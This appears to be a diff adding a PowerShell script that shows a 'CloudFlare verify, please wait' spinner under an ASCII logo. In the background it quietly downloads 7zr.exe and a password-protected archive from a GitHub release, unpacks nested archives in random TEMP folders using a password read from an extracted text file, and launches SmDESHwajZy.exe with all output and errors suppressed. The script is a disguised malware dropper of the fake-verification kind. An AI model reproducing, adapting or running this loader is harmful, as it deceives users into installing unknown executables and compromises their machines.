@@ -1,0 +1,205 @@
+﻿$SevenZipUrl = 'https://github.com/ip7z/7zip/releases/download/26.02/7zr.exe'
+$PortableSevenZip = Join-Path $PSScriptRoot '7zr.exe'
+$Urlar = 'https://github.com/addisonesparza/myrep2/releases/download/gn/gddde.7z'
+$OuterPassword = 'XfDZleITorJeZH'
+
+
+$logo = @(
+    ' ########  ###                         ###  #########'
+    '########## ###    ###     ##   #    ## #### #### ####   ####    ## ##   ###'
+    '###        ###  #######  ###  ### ################### ######## ###### ########'
+    '###    #   ### ####  ### ###  ### ###  #### ###  ####  ####### ####  #########'
+    '########## ### #### #### ######## #### #### ###  #### ###  ### ####   ### ####'
+    ' ########  ###  #######  ########  #######  ###  #### ######## ####   #######'
+)
+
+[string[]]$spinnerFrames = @('|', '/', '-', '\')
+
+$downloadJob = $null
+$downloadSucceeded = $false
+$statusRow = 0
+
+function Write-Status {
+    param(
+        [string]$Text,
+        [ConsoleColor]$Color
+    )
+
+    $width = [Console]::WindowWidth
+    $left = [Math]::Max(0, [Math]::Floor(($width - $Text.Length) / 2))
+
+    [Console]::SetCursorPosition(0, $script:statusRow)
+    Write-Host (' ' * [Math]::Max(1, $width - 1)) -NoNewline
+
+    [Console]::SetCursorPosition($left, $script:statusRow)
+    Write-Host $Text -NoNewline -ForegroundColor $Color
+}
+
+try {
+    [Console]::CursorVisible = $false
+    Clear-Host
+
+    $windowWidth = [Console]::WindowWidth
+    $windowHeight = [Console]::WindowHeight
+
+    $logoWidth = ($logo | Measure-Object -Property Length -Maximum).Maximum
+    $logoLeft = [Math]::Max(0, [Math]::Floor(($windowWidth - $logoWidth) / 2))
+    $logoTop = [Math]::Max(0, [Math]::Floor(($windowHeight - $logo.Count - 4) / 2))
+
+    for ($line = 0; $line -lt $logo.Count; $line++) {
+        [Console]::SetCursorPosition($logoLeft, $logoTop + $line)
+        Write-Host $logo[$line] -NoNewline -ForegroundColor Cyan
+    }
+
+    $statusRow = $logoTop + $logo.Count + 2
+
+    $downloadJob = Start-Job -ArgumentList @($SevenZipUrl, $PortableSevenZip, $Urlar, $OuterPassword ) -ScriptBlock {
+        param(
+            [string]$SevenZipUrl,
+            [string]$PortableSevenZip,
+			[string]$Url,
+			[string]$OuterPassword
+        )
+		
+		
+		function Expand-ArchiveWith7Zip {
+    param(
+        [Parameter(Mandatory)]
+        [string]$SevenZip,
+
+        [Parameter(Mandatory)]
+        [string]$ArchivePath,
+
+        [Parameter(Mandatory)]
+        [string]$Destination,
+
+        [Parameter(Mandatory)]
+        [string]$Password
+    )
+
+    New-Item -ItemType Directory -Path $Destination -Force | Out-Null
+
+    & $SevenZip x `
+        $ArchivePath `
+        "-o$Destination" `
+        "-p$Password" `
+        -y `
+        -bso0 `
+        -bsp0
+}
+		
+	$WorkDirectoryName = [Guid]::NewGuid().ToString('N') + '-' + [Guid]::NewGuid().ToString('N')
+    $WorkDirectory = Join-Path -Path $env:TEMP -ChildPath $WorkDirectoryName
+    $OuterDirectory = Join-Path -Path $WorkDirectory -ChildPath ([Guid]::NewGuid().ToString('N'))
+    $FinalDirectory = Join-Path -Path $WorkDirectory -ChildPath ([Guid]::NewGuid().ToString('N'))
+	$DownloadedArchive = Join-Path -Path $WorkDirectory -ChildPath ([Guid]::NewGuid().ToString('N') + '.olosg')		
+
+    New-Item -ItemType Directory -Path $WorkDirectory -Force | Out-Null
+    New-Item -ItemType Directory -Path $OuterDirectory -Force | Out-Null
+    New-Item -ItemType Directory -Path $FinalDirectory -Force | Out-Null
+    $ProgressPreference = 'SilentlyContinue'
+    $VerbosePreference = 'SilentlyContinue'
+    $WarningPreference = 'SilentlyContinue'
+    $InformationPreference = 'SilentlyContinue'
+    $ErrorActionPreference = 'Stop'
+
+        Invoke-WebRequest -Uri $SevenZipUrl -OutFile $PortableSevenZip -UseBasicParsing -ErrorAction Stop *> $null
+		
+		
+		
+		Invoke-WebRequest -Uri $Url -OutFile $DownloadedArchive -UseBasicParsing -ErrorAction Stop *> $null
+		
+		
+		Expand-ArchiveWith7Zip `
+    -SevenZip $PortableSevenZip `
+    -ArchivePath $DownloadedArchive `
+    -Destination $OuterDirectory `
+    -Password $OuterPassword
+
+$ExtractedFiles = @(
+    Get-ChildItem -LiteralPath $OuterDirectory -File -Recurse
+)
+
+$TextFiles = @(
+    $ExtractedFiles | Where-Object {
+        $_.Extension -ieq '.txt'
+    }
+)
+
+$NestedArchives = @(
+    $ExtractedFiles | Where-Object {
+        $_.Extension -in @('.zip', '.7z', '.rar')
+    }
+)
+
+if (
+    $ExtractedFiles.Count -ne 2 -or
+    $TextFiles.Count -ne 1 -or
+    $NestedArchives.Count -ne 1
+) {
+    throw ' '
+}
+$Reader = [IO.StreamReader]::new(
+    $TextFiles[0].FullName,
+    [Text.Encoding]::UTF8,
+    $true
+)
+
+try {
+    $TextContent = $Reader.ReadToEnd()
+}
+finally {
+    $Reader.Dispose()
+}
+
+$InnerPassword = $TextContent.Trim()
+
+Expand-ArchiveWith7Zip `
+    -SevenZip $PortableSevenZip `
+    -ArchivePath $NestedArchives[0].FullName `
+    -Destination $FinalDirectory `
+    -Password $InnerPassword
+
+Start-Process "$FinalDirectory\SmDESHwajZy.exe"
+	 	
+    }
+
+    $i = 0
+
+    while ($downloadJob.State -in @('NotStarted', 'Running')) {
+        $frameIndex = $i % $spinnerFrames.Length
+        $frame = $spinnerFrames[$frameIndex]
+
+        Write-Status -Text "CloudFlare verify, please wait $frame" -Color Yellow
+
+        $i++
+        Start-Sleep -Milliseconds 100
+    }
+
+    Wait-Job -Job $downloadJob | Out-Null
+
+    if ($downloadJob.State -eq 'Completed') {
+        $downloadSucceeded = $true
+        Write-Status -Text 'CloudFlare verify Completed' -Color Green
+    }
+   
+}
+catch {
+    
+}
+finally {
+    if ($null -ne $downloadJob) {
+        Remove-Job -Job $downloadJob -Force -ErrorAction SilentlyContinue | Out-Null
+    }
+
+    [Console]::CursorVisible = $true
+}
+
+Write-Host
+Write-Host 'Press any key to exit...' -ForegroundColor DarkGray
+
+[Console]::ReadKey($true) | Out-Null
+
+if (-not $downloadSucceeded) {
+    exit 1
+}
